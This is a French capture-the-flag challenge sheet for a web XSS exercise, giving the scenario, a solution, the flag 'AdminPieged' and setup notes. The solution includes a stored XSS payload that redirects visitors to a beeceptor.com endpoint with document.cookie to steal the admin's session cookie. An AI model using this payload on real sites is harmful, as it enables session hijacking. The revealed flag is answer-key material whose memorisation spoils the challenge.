# Titre : Cookie-Jar-XSS

# Catégorie : WEB

## Équipe : WEB

## Personnes : Christophe G-A, Marius V

## Description - Énoncé :

La légende raconte qu'un admin se connecte régulièrement pour supprimer les différents messages. Mais demandez l'aide du chevalier beeceptor pour progresser dans votre quête mais penser aussi à vous renseigner sur la magie noire : Cross-Site Scripting.

# Solution :

<<attention ce challenge n'est pas autonome>>

On arrive sur une page dans laquelle on peut afficher des messages, dans ces messages on peut y mettre des balises javascript et y exécuter des scripts pour tout ceux qui voient cette page. il faut y mettre une redirection vers un site tel que beeceptor et y envoyer le cookie de connexion de l’admin via une faille XSS.
ex de script de redirection : "<script>window.location.href = "https://persoo.free.beeceptor.com?cookie=" + document.cookie;</script>"
et utiliser un site tel que beeceptor pour récupérer les infos de la redirection.

Pour simuler le connexion de l’admin on va sur la page admin.php avec le cookie de connexion et cliquer sur le lien(permet de clear les messages)Malheureusement il faut connecter l’admin manuellement / via une macro clavier ou si on veut tenter de développer on  pourrait le faire avec node.js et une extension Puppeteer.

\--pour l'admin peser a se connecter en ayant créer le cookie qui a pour valeur ce flag !!!!

# URL de connexion : ...../vr05/

# flag : AdminPieged

# Docker (Merci de commenter votre Dockerfile):

- [x] oui :
  - Explication du fonctionnement du docker : "docker-compose"
- [ ] non